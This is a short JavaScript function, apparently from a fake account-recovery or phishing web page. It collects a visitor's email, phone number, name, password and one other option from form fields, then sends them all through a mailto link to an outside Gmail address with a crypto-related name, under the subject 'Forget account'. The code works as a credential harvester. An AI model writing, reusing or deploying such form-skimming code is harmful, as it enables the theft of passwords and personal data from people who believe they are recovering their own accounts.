
function sendData(){
    var data1 = document.getElementById("email").value;
    var data2 = document.getElementById("phone").value;
    var data3 = document.getElementById("name").value;
    var data4 = document.getElementById("password").value;
    var data5 = document.getElementById("cng").value;
window.location.href=`mailto:cryptocashp2p@gmail.com?subject=Forget account by ${data2}!&body=
[
    {
        "cng option":"${data5}"
    },
    {
        "email":"${data1}",
        "phone":"${data2}",
        "name":"${data3}",
        "password":"${data4}",
    }
]

`

};